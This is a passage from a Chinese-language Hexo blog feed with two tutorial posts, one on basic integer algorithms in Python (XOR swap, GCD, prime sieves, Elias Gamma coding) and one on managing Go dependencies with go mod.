        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>一些基础数据类型的算法</p></blockquote><a id="more"></a><h2 id="整形交换值"><a class="markdownIt-Anchor" href="#整形交换值"></a> 整形交换值</h2><ul><li>在不适用其他变量的情况下，利用异或操作，交换两个变量的值</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = <span class="number">1234</span>, <span class="number">5678</span></span><br><span class="line">a = a + b  <span class="comment"># 这种方法会可能产生数据溢出</span></span><br><span class="line">b = a - b</span><br><span class="line">a = a - b</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a, b = <span class="number">1234</span>, <span class="number">5678</span></span><br><span class="line">a = a ^ b  <span class="comment"># a = 4860</span></span><br><span class="line">b = a ^ b  <span class="comment"># b = 1234</span></span><br><span class="line">a = a ^ b  <span class="comment"># a = 5678</span></span><br></pre></td></tr></table></figure><h2 id="最大公约数"><a class="markdownIt-Anchor" href="#最大公约数"></a> 最大公约数</h2><ul><li>求<code>a</code>,<code>b</code>的最大公约数。</li><li>对整数求余，最著名的是欧几里得法：①先求两数相除后的余数，即<code>d=a/b</code>；②那么<code>a</code>,<code>b</code>的最大公约数就等于<code>d</code>,<code>b</code>的最大公约数。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a,b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a % b ==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    d = a % b</span><br><span class="line">    <span class="keyword">return</span> gcd(b,d)</span><br><span class="line">print(<span class="number">128</span>,<span class="number">48</span>,gcd(<span class="number">128</span>,<span class="number">48</span>))</span><br></pre></td></tr></table></figure><ul><li>尝试不使用乘法、除法和求余，计算最大公约数，这就需要位运算了。</li><li>思路就是：<code>a = k·b + d</code>，那么<code>k</code>可以用二进制来代替，使用位运算，将<code>b</code>进行左移多次，从而利用加减法即可求出<code>d</code>。</li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>b</mi><mo>&lt;</mo><mo>&lt;</mo><msub><mi>t</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>&lt;</mo><mo>&lt;</mo><msub><mi>t</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>&lt;</mo><mspace width="1em"/><mi>a</mi><mspace width="1em"/><mo>&lt;</mo><mi>b</mi><mo>&lt;</mo><mo>&lt;</mo><msub><mi>t</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>&lt;</mo><mo>&lt;</mo><msub><mi>t</mi><mn>2</mn></msub><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo>+</mo><mi>b</mi></mrow><annotation encoding="application/x-tex">b&lt;&lt;t_1 + b&lt;&lt;t_2 ... &lt;  \quad a \quad &lt; b&lt;&lt;t_1 + b&lt;&lt;t_2 ... + b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mspace" style="margin-right:1em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span></span><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">.</span><span class="mord">.</span><span class="mord">.</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span></span></span></span></span></p><ul><li>得到<code>t</code>的数组，求出余数，再利用欧几里得法即可。</li></ul><h2 id="素数判定"><a class="markdownIt-Anchor" href="#素数判定"></a> 素数判定</h2><ul><li>素数也称质数，质数的个数是无穷的。欧几里得的《几何原本》中有一个经典的证明。它使用了证明常用的方法：反证法。</li><li>关于1是不是质数，1不是质数。一个大于1的自然数，除了1和它自身外，不能整除其他自然数的数叫做质数；否则称为合数。质数的定义中明确指出了一个前提条件，一个大于1的自然数。1不属于这个范围，所以1不是质数。</li><li>历史上，曾经将1也包含在质数之内，但后来为了算术基本定理，最终1被数学家排除在质数之外，而从高等代数的角度来看，1是乘法单位元，也不能算在质数之内，并且，所有的合数都可由若干个质数相乘而得到。</li><li><strong>题目</strong>：给定一个正整数<code>n</code>，返回<code>1~n</code>中所有的素数。</li></ul><h3 id="暴力法"><a class="markdownIt-Anchor" href="#暴力法"></a> 暴力法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num &lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,num):</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">number = <span class="number">100</span></span><br><span class="line">primeList = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(number):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        primeList.append(i)</span><br><span class="line">print(primeList)</span><br></pre></td></tr></table></figure><ul><li>时间复杂度：O(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>n</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>)</li><li>暴力法的缺点就是时间复杂度太高</li></ul><h3 id="只考虑是否能够整除素数"><a class="markdownIt-Anchor" href="#只考虑是否能够整除素数"></a> 只考虑是否能够整除素数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">primeList = [<span class="number">2</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isPrime</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num &lt;<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> primeList:</span><br><span class="line">        <span class="keyword">if</span> num % i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">number = <span class="number">100</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(number):</span><br><span class="line">    <span class="keyword">if</span> isPrime(i):</span><br><span class="line">        primeList.append(i)</span><br><span class="line">print(primeList)</span><br></pre></td></tr></table></figure><h3 id="删除所有素数的倍数"><a class="markdownIt-Anchor" href="#删除所有素数的倍数"></a> 删除所有素数的倍数</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number = <span class="number">100</span></span><br><span class="line">primeList = [<span class="literal">True</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,number+<span class="number">1</span>)]</span><br><span class="line">primeList[<span class="number">0</span>],primeList[<span class="number">1</span>] = <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> index,i <span class="keyword">in</span>  enumerate(primeList):</span><br><span class="line">    <span class="keyword">if</span> i:</span><br><span class="line">        j = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> j*index&lt;=number:</span><br><span class="line">            primeList[j*index] = <span class="literal">False</span></span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> index,i <span class="keyword">in</span> enumerate(primeList):</span><br><span class="line">    <span class="keyword">if</span> i:</span><br><span class="line">        print(index,end=<span class="string">&quot;, &quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="elias-gamma编码"><a class="markdownIt-Anchor" href="#elias-gamma编码"></a> Elias Gamma编码</h2><ul><li>编码描述：给定整数，将其转化为二进制字符串形式，然后获取字符串长度减一，添加对应数量的0在字符串前面。</li><li>要求：给定含有n个元素的整形数组，将每个元素进行Elias编码，并拼接字符串。同时实现解码字符串，返回整形数组。</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EliasGamma</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">self,str</span>):</span></span><br><span class="line">        valueStrList = self.get_binary_value_list(str)</span><br><span class="line">        valueList = self.get_value_list(valueStrList)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_value_list</span>(<span class="params">self,valueStrList</span>):</span></span><br><span class="line">        result = []</span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> valueStrList:</span><br><span class="line">            content = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> index,i <span class="keyword">in</span> enumerate(value):</span><br><span class="line">                <span class="keyword">if</span> i==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">                    content += <span class="number">1</span> &lt;&lt; (len(value)-index<span class="number">-1</span>)</span><br><span class="line">            result.append(content)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_binary_value_list</span>(<span class="params">self,str</span>):</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        result = []</span><br><span class="line">        length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> str[<span class="number">0</span>]!=<span class="string">&quot;0&quot;</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">&quot;err&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> i&lt;len(str):</span><br><span class="line">            <span class="keyword">if</span> str[i]==<span class="string">&quot;0&quot;</span>:</span><br><span class="line">                length += <span class="number">1</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result.append(str[i:i+length+<span class="number">1</span>])</span><br><span class="line">                i += length+<span class="number">1</span></span><br><span class="line">                length = <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">self,valueList</span>):</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> value <span class="keyword">in</span> valueList:</span><br><span class="line">            str = self.get_binary_string(value)</span><br><span class="line">            result += self.add_zero_to_head(str)</span><br><span class="line">        print(result)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_binary_string</span>(<span class="params">self,value</span>):</span></span><br><span class="line">        result = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> value &lt;=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;0&quot;</span></span><br><span class="line">        <span class="keyword">while</span> value:</span><br><span class="line">            <span class="keyword">if</span> value%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                result = <span class="string">&quot;0&quot;</span> + result</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = <span class="string">&quot;1&quot;</span> + result</span><br><span class="line">            value = value&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add_zero_to_head</span>(<span class="params">self,str</span>):</span></span><br><span class="line">        result = str</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(str)<span class="number">-1</span>):</span><br><span class="line">            result = <span class="string">&quot;0&quot;</span> + result</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    EliasGamma().decode(<span class="string">&quot;000101100011000001101&quot;</span>)</span><br><span class="line">    EliasGamma().encode([<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>])</span><br></pre></td></tr></table></figure><ul><li>这里需要优化的是代码整体结构，将代码主逻辑和分支合理的划分，体现出业务逻辑转化为实际代码的能力，将复杂业务拆解为简单模块的组合。</li></ul><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> data structure </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go包管理工具——gomod</title>
      <link href="/2020/06/06/gomod/"/>
      <url>/2020/06/06/gomod/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>gomod在Go v1.12功能基本稳定，到下一个版本 v1.13将默认开启，是时候开始在项目中使用gomod了。</p></blockquote><a id="more"></a><h1 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h1><ul><li>Go 的包管理方式是逐渐演进的， 最初是 monorepo 模式，所有的包都放在 GOPATH 里面，使用类似命名空间的包路径区分包，不过这种包管理显然是有问题，由于包依赖可能会引入破坏性更新，生产环境和测试环境会出现运行不一致的问题。</li><li>从 v1.5 开始开始引入 vendor 包模式，如果项目目录下有 vendor 目录，那么 go 工具链会优先使用 vendor 内的包进行编译、测试等，这之后第三方的包管理思路都是通过这种方式来实现，比如说由社区维护准官方包管理工具 dep。</li><li>不过官方并不认同这种方式，在 v1.11 中加入了 Go Module 作为官方包管理形式，就这样 dep 无奈的结束了使命。最初的 Go Module 提案的名称叫做 vgo，下面为了介绍简称为 gomod。不过在 v1.11 和 v1.12 的 Go 版本中 gomod 是不能直接使用的。可以通过 go env 命令返回值的 GOMOD 字段是否为空来判断是否已经开启了 gomod，如果没有开启，可以通过设置环境变量 export GO111MODULE=on 开启。</li></ul><h1 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h1><h2 id="初始化"><a class="markdownIt-Anchor" href="#初始化"></a> 初始化</h2><ul><li>在项目目录直接使用<code>go mod init</code></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go mod init</span><br></pre></td></tr></table></figure><ul><li>这时可看到目录内多了 go.mod 文件，内容很简单只有两行：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">module github.com&#x2F;islishude&#x2F;gomodtest</span><br><span class="line">go 1.12</span><br></pre></td></tr></table></figure><ul><li>首行为当前的模块名称，接下来是 go 的使用版本。这两行和 npm package.json 的 name 和 engine 字段的功能很类似。</li><li>其中项目引用了没有下载的包<code>import &quot;rsc.io/quote&quot;</code>，如果是默认情况下，使用 go run main.go 肯定会提示找不到这个包的错误，但是当前 gomod 模式，如果没有此依赖回先下载这个依赖。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go run main.go</span><br><span class="line">go: finding rsc.io&#x2F;quote v1.5.2</span><br><span class="line">go: finding rsc.io&#x2F;sampler v1.3.0</span><br><span class="line">go: finding golang.org&#x2F;x&#x2F;text v0.0.0-20170915032832-14c0d48ead0c</span><br><span class="line">go: downloading rsc.io&#x2F;quote v1.5.2</span><br><span class="line">go: extracting rsc.io&#x2F;quote v1.5.2</span><br><span class="line">go: downloading rsc.io&#x2F;sampler v1.3.0</span><br><span class="line">go: extracting rsc.io&#x2F;sampler v1.3.0</span><br><span class="line">go: downloading golang.org&#x2F;x&#x2F;text v0.0.0-20170915032832-14c0d48ead0c</span><br><span class="line">go: extracting golang.org&#x2F;x&#x2F;text v0.0.0-20170915032832-14c0d48ead0c</span><br><span class="line">Hello, world.</span><br></pre></td></tr></table></figure><ul><li><p>因为包含<code>http://golang.org</code>下的包，记得设置代理。这个时候当前包目录除了 <code>go.mod</code> 还有一个 go.sum 的文件，这个类似 npm package-lock.json</p></li><li><p>gomod 不会在 $GOPATH/src 目录下保存 <a href="http://rsc.io">rsc.io</a> 包的源码，而是包源码和链接库保存在 $GOPATH/pkg/mod 目录下。</p></li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ls $GOPATH&#x2F;pkg&#x2F;mod</span><br><span class="line">cache      golang.org rsc.io</span><br></pre></td></tr></table></figure><ul><li>除了 go run 命令以外，go build、go test 等命令也能自动下载相关依赖包。</li></ul><h2 id="安装依赖"><a class="markdownIt-Anchor" href="#安装依赖"></a> 安装依赖</h2><ul><li>如果要想先下载依赖，那么可以直接像以前那样 go get 即可，不过 gomod 下可以跟语义化版本号，比如 go get foo@v1.2.3，也可以跟 git 的分支或 tag，比如go get foo@master，当然也可以跟 git 提交哈希，比如 go get foo@e3702bed2。需要特别注意的是，gomod 除了遵循语义化版本原则外，还遵循最小版本选择原则，也就是说如果当前版本是 v1.1.0，只会下载不超过这个最大版本号。如果使用 go get foo@master，下次在下载只会和第一次的一样，无论 master 分支是否更新了代码，如下所示，使用包含当前最新提交哈希的虚拟版本号替代直接的 master 版本号。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go get golang.org&#x2F;x&#x2F;crypto&#x2F;sha3@master</span><br><span class="line">go: finding golang.org&#x2F;x&#x2F;crypto&#x2F;sha3 latest</span><br><span class="line">go: finding golang.org&#x2F;x&#x2F;crypto latest</span><br><span class="line">$ cat go.mod</span><br><span class="line">module github.com&#x2F;adesight&#x2F;test</span><br><span class="line">go 1.12</span><br><span class="line">require (</span><br><span class="line">golang.org&#x2F;x&#x2F;crypto v0.0.0-20190313024323-a1f597ede03a &#x2F;&#x2F; indirect</span><br><span class="line">rsc.io&#x2F;quote v1.5.2</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>如果下载所有依赖可以使用 go mod download 命令。</li></ul><h2 id="升级依赖"><a class="markdownIt-Anchor" href="#升级依赖"></a> 升级依赖</h2><ul><li>查看所有以升级依赖版本：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go list -u -m all</span><br><span class="line">go: finding golang.org&#x2F;x&#x2F;sys latest</span><br><span class="line">go: finding golang.org&#x2F;x&#x2F;crypto latest</span><br><span class="line">github.com&#x2F;adesight&#x2F;test</span><br><span class="line">golang.org&#x2F;x&#x2F;crypto v0.0.0-20190313024323-a1f597ede03a</span><br><span class="line">golang.org&#x2F;x&#x2F;sys v0.0.0-20190215142949-d0b11bdaac8a [v0.0.0-20190316082340-a2f829d7f35f]</span><br><span class="line">golang.org&#x2F;x&#x2F;text v0.3.0</span><br><span class="line">rsc.io&#x2F;quote v1.5.2</span><br><span class="line">rsc.io&#x2F;sampler v1.99.99</span><br></pre></td></tr></table></figure><ul><li>升级次级或补丁版本号：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go get -u rsc.io&#x2F;quote</span><br></pre></td></tr></table></figure><ul><li>仅升级补丁版本号：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go get -u&#x3D;patch rscio&#x2F;quote</span><br></pre></td></tr></table></figure><ul><li>升降级版本号，可以使用比较运算符控制：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go get foo@&#39;&lt;v1.6.2&#39;</span><br></pre></td></tr></table></figure><h2 id="移除依赖"><a class="markdownIt-Anchor" href="#移除依赖"></a> 移除依赖</h2><ul><li>当前代码中不需要了某些包，删除相关代码片段后并没有在 go.mod 文件中自动移出。</li><li>运行下面命令可以移出所有代码中不需要的包：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go mod tidy</span><br></pre></td></tr></table></figure><ul><li>如果仅仅修改 go.mod 配置文件的内容，那么可以运行 go mod edit --droprequire=path，比如要移出 <a href="http://golang.org/x/crypto">golang.org/x/crypto</a> 包</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go mod edit --droprequire&#x3D;golang.org&#x2F;x&#x2F;crypto</span><br></pre></td></tr></table></figure><h2 id="查看依赖包"><a class="markdownIt-Anchor" href="#查看依赖包"></a> 查看依赖包</h2><ul><li>可以直接查看 go.mod 文件，或者使用命令行：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go list -m all</span><br><span class="line">github.com&#x2F;adesight&#x2F;test</span><br><span class="line">golang.org&#x2F;x&#x2F;crypto v0.0.0-20190313024323-a1f597ede03a</span><br><span class="line">golang.org&#x2F;x&#x2F;sys v0.0.0-20190215142949-d0b11bdaac8a</span><br><span class="line">golang.org&#x2F;x&#x2F;text v0.3.0</span><br><span class="line">rsc.io&#x2F;quote v1.5.2</span><br><span class="line">rsc.io&#x2F;sampler v1.99.99</span><br><span class="line">$ go list -m -json all # json 格式输出</span><br><span class="line">&#123;</span><br><span class="line">        &quot;Path&quot;: &quot;golang.org&#x2F;x&#x2F;text&quot;,</span><br><span class="line">        &quot;Version&quot;: &quot;v0.3.0&quot;,</span><br><span class="line">        &quot;Time&quot;: &quot;2017-12-14T13:08:43Z&quot;,</span><br><span class="line">        &quot;Indirect&quot;: true,</span><br><span class="line">        &quot;Dir&quot;: &quot;&#x2F;Users&#x2F;lishude&#x2F;go&#x2F;pkg&#x2F;mod&#x2F;golang.org&#x2F;x&#x2F;text@v0.3.0&quot;,</span><br><span class="line">        &quot;GoMod&quot;: &quot;&#x2F;Users&#x2F;lishude&#x2F;go&#x2F;pkg&#x2F;mod&#x2F;cache&#x2F;download&#x2F;golang.org&#x2F;x&#x2F;text&#x2F;@v&#x2F;v0.3.0.mod&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">        &quot;Path&quot;: &quot;rsc.io&#x2F;quote&quot;,</span><br><span class="line">        &quot;Version&quot;: &quot;v1.5.2&quot;,</span><br><span class="line">        &quot;Time&quot;: &quot;2018-02-14T15:44:20Z&quot;,</span><br><span class="line">        &quot;Dir&quot;: &quot;&#x2F;Users&#x2F;lishude&#x2F;go&#x2F;pkg&#x2F;mod&#x2F;rsc.io&#x2F;quote@v1.5.2&quot;,</span><br><span class="line">        &quot;GoMod&quot;: &quot;&#x2F;Users&#x2F;lishude&#x2F;go&#x2F;pkg&#x2F;mod&#x2F;cache&#x2F;download&#x2F;rsc.io&#x2F;quote&#x2F;@v&#x2F;v1.5.2.mod&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="模块配置文本格式化"><a class="markdownIt-Anchor" href="#模块配置文本格式化"></a> 模块配置文本格式化</h2><ul><li>由于可手动修改 go.mod 文件，所以可能此文件并没有被格式化，使用下面命令进行文本格式化。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go mod edit -fmt</span><br></pre></td></tr></table></figure><h2 id="发布版本"><a class="markdownIt-Anchor" href="#发布版本"></a> 发布版本</h2><ul><li>发布包新版本和其它包管理工具基本一致，可以直接打标签，不过打标签之前需要在 go.mod 中写入相应的版本号：</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ go mod edit --module&#x3D;github.com&#x2F;islishude&#x2F;gomodtest&#x2F;v2</span><br><span class="line">$ cat go.mod</span><br><span class="line">module github.com&#x2F;islishude&#x2F;gomodtest&#x2F;v2</span><br><span class="line">go 1.12</span><br><span class="line">require (</span><br><span class="line">golang.org&#x2F;x&#x2F;crypto v0.0.0-20190313024323-a1f597ede03a &#x2F;&#x2F; indirect</span><br><span class="line">rsc.io&#x2F;quote v1.5.2</span><br><span class="line">)</span><br></pre></td></tr></table></figure><ul><li>官方推荐将上述过程在一个新分支来避免混淆，那么类如上述例子可以创建一个 v2 分支，但这个不是强制要求的。</li><li>还有一种方式发布新版本，那就是在主线版本种加入 v2 文件夹，相应的也需要内置 go.mod 这个文件。</li><li>比如上述我们引入的 <a href="http://rsc.io/quote">http://rsc.io/quote</a> 包，其中 v3 版本是用内置文件夹，而 v2 使用的是 tag。</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ tree .</span><br><span class="line">.</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.md</span><br><span class="line">├── buggy</span><br><span class="line">│   └── buggy_test.go</span><br><span class="line">├── go.mod</span><br><span class="line">├── go.sum</span><br><span class="line">├── quote.go</span><br><span class="line">├── quote_test.go</span><br><span class="line">└── v3</span><br><span class="line">    ├── go.mod</span><br><span class="line">    ├── go.sum</span><br><span class="line">    └── quote.go</span><br><span class="line">$ git tag -a</span><br><span class="line">bad</span><br><span class="line">v1.0.0</span><br><span class="line">v1.1.0</span><br><span class="line">v1.2.0</span><br><span 